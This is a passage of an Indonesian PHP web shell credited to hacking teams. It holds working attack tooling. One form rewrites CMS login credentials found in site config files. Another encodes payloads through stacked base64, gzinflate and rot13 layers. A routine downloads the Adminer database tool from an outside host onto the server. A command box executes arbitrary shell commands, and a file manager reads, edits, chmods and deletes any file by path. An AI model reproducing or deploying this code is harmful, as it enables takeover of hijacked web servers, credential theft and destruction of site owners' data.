 if(!$update OR !$conn OR !$db) {
 echo "Status => <font color=red>".mysql_error()."</font><br><br>";
 } else {
 echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
 }
 mysql_close($conn);
 }
 }
 }
 } else {
 echo "<center>
 <h1>Auto Edit User Config</h1>
 <form method='post'>
 DIR Config: <br>
 <input type='text' size='50' name='config_dir' value='$dir'><br><br>
 Set User & Pass: <br>
 <input type='text' name='user_baru' value='zet brohhh' placeholder='user_baru'><br>
 <input type='text' name='pass_baru' value='zet brohhh' placeholder='pass_baru'><br>
 <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
 </form>
 <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
 ";
 }
 
 } elseif($_GET['do'] == 'endec') {
 @ini_set('output_buffering',0); 
 @ini_set('display_errors', 0);
 $text = $_POST['code'];
 ?>
 <center>
 <h2>Encode And Decode</h2>
 <form method="post">
 <br>
 <textarea class='form-control con7' cols='60' rows='10' name="code"></textarea>
 <br><br>
 <select class='form-control con7' size="1" name="ope">
 <center>
 <option value="urlencode">url</option>
 <option value="base64">base64</option>
 <option value="ur">convert_uu</option>
 <option value="json">json</option>
 <option value="gzinflates">gzinflate - base64</option>
 <option value="str2">str_rot13 - base64</option>
 <option value="gzinflate">str_rot13 - gzinflate - base64</option>
 <option value="gzinflater">gzinflate - str_rot13 - base64</option>
 <option value="gzinflatex">gzinflate - str_rot13 - gzinflate - base64</option>
 <option value="gzinflatew">str_rot13-convert_uu-url-gzinflate-str_rot13-base64-convert_uu-gzinflate-url-str_rot13-gzinflate-base64</option>
 <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
 <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
 </center>
 </select>
 &nbsp;<br><br><input class='kntd' type='submit' name='submit' value='Encode'>
 <input class='kntd' type='submit' name='submits' value='Decode'>
 </form>
 <br>
 <?php 
 $submit = $_POST['submit'];
 if (isset($submit)){
 $op = $_POST["ope"];
 switch ($op) {case 'base64': $codi=base64_encode($text);
 break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
 break;case 'json' : $codi=json_encode(utf8_encode($text));
 break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
 break;case 'gzinflater' : $codi=base64_encode(str_rot13(gzdeflate($text)));
 break;case 'gzinflatex' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
 break;case 'gzinflatew' : $codi=base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
 break;case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
 break;case 'str2' : $codi=base64_encode(str_rot13($text));
 break;case 'urlencode' : $codi=rawurlencode($text);
 break;case 'ur' : $codi=convert_uuencode($text);
 break;case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
 break;default:break;}}
 
 $submit = $_POST['submits'];
 if (isset($submit)){
 $op = $_POST["ope"];
 switch ($op) {case 'base64': $codi=base64_decode($text);
 break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
 break;case 'json' : $codi=utf8_decode(json_decode($text));
 break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
 break;case 'gzinflater' : $codi=gzinflate(str_rot13(base64_decode($text)));
 break;case 'gzinflatex' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
 break;case 'gzinflatew' : $codi=str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
 break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
 break;case 'str2' : $codi=str_rot13(base64_decode($text));
 break;case 'urlencode' : $codi=rawurldecode($text);
 break;case 'ur' : $codi=convert_uudecode($text);
 break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
 break;default:break;}}
 $html = htmlentities(stripslashes($codi));
 echo "<form><textarea cols=60 rows=10 class='form-control con7' >".$html."</textarea></center></form><br/><br/>";
 } elseif($_GET['do'] == 'hashgen') {
 $submit = $_POST['enter'];
 if (isset($submit)) {
 $pass = $_POST['password']; // password
 $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
 $hash = md5($pass); // md5 hash #1
 $md4 = hash("md4", $pass);
 $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
 $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
 $hash1 = sha1($pass); // sha1 hash #4
 $sha256 = hash("sha256", $text);
 $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
 $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
 }
 echo '<form action="" method="post">';
 echo '<center><h2>Hash Generator</h2>';
 echo '<table>';
 echo 'Masukkan teks yang ingin di encrypt: ';
 echo '<input class="inputz" type="text" name="password" size="40">';
 echo '<input class="inputzbut" type="submit" name="enter" value="Hash!">';
 echo '<br>';
 echo 'Original Password: <input class=inputz type=text size=50 value='.$pass.'><br><br>';
 echo 'MD5: <input class=inputz type=text size=50 value='.$hash.'><br><br>';
 echo 'MD4: <input class=inputz type=text size=50 value='.$md4 .'><br><br>';
 echo 'MD5 with Salt: <input class=inputz type=text size=50 value='.$hash_md5.'><br><br>';
 echo 'MD5 with Salt & Sha1: <input class=inputz type=text size=50 value='.$hash_md5_double.'><br><br>';
 echo 'Sha1: <input class=inputz type=text size=50 value='.$hash1 .'><br><br>';
 echo 'Sha256: <input class=inputz type=text size=50 value='.$sha256.'><br><br>';
 echo 'Sha1 with Salt: <input class=inputz type=text size=50 value='.$hash1_sha1.'><br><br>';
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
 } elseif($_GET['do'] == 'about') {
   ?>
   <tr>
   <td>
   <center>
   <h2 style='color'#00ddff'>About Me</font></h2>
   <p style='color: white;'>Team: JawaBaratCyber - <font color="red">Cowok Tersakiti Team</font> - Indonrsian error system - JavaCyberArmy - Dan lain lain</p>
   </center>
   </td>
   </tr>
   <?php
   } elseif($_GET['do'] == 'adminer') {
 $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
 function adminer($url, $isi) {
 $fp = fopen($isi, "w");
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_FILE, $fp);
 return curl_exec($ch);
 curl_close($ch);
 fclose($fp);
 ob_flush();
 flush();
 }
 if(file_exists('adminer.php')) {
 echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
 } else {
 if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
 echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
 } else {
 echo "<center><font color=red>gagal buat file adminer</font></center>";
 }  

 }

}  elseif($_GET['to'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
}

if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo "[ <a href='?path=$path'>Kembali</a> ]"; 
echo('<textarea class="potext" cols=80 rows=20> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">CANGE PERM SUCCES !!!!!</font><br/>';
echo "[ <a href='?path=$path'>Kembali</a> ]";
}else{
echo '<script> alert("CANGE PERM GAGAL NJING !!!!!")</font><br />';
}
}
echo '<form method="POST">
Permission : <br><input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left"/>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod"><br>
<input type="submit" value="submit" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver"/>
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">RENAME SUCCES !!!!!</font><br/>';
echo "[ <a href='?path=$path'>Kembali</a> ]";
}else{
echo '<script> alert("RENAME GAGAL !!!!!")</script><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name <br><input name="newname" type="text" size="20" value="'.$_POST['name'].'" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:black;color:silver;border:2px solid silver; text-align: left"/>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename"><br>
<input type="submit" value="submit" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver"/>
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">EDIT SUCCES<br/>';
echo "[ <a href='?path=$path'>Kembali</a> ]";
}else{
echo '<script> alert("EDIT GAGAL CONG !!!!!")</script></font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea class="potext" cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" style="margin-top:4px;width:500px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver;border-radius:5px"/>
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<script> alert("SUCCES !!!!!")</script><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus om                                                                                                                                                                                                                                                                                           </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<script> alert("SUCCES !!!!!")</script><br/>';
}else{
echo '<font color="red">File Gagal Dihapus om</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="100%" class="td_table">
<tr class="first">
<td class="pl"><center><font>Name</peller></center></td>
<td class="pl"><center><font>Size</peller></center></td>
<td class="pl"><center><font>Permission</peller></center></td>
<td class="pl"><center><font>Action</peller></center></td>
</tr>';
foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr class="s_tb">
<td class="pt"><img src="data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs="> <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td class="pl"><center>--</center></td>
<td class="pl"><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td class="pl"><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">RenaMe</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr class="pl">
<td class="pt"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII="> <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td class="pl"><center>'.$size.'</center></td>
<td class="pl"><center>';
if(is_writable($path.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td class="pl"><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">" Zildan</center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
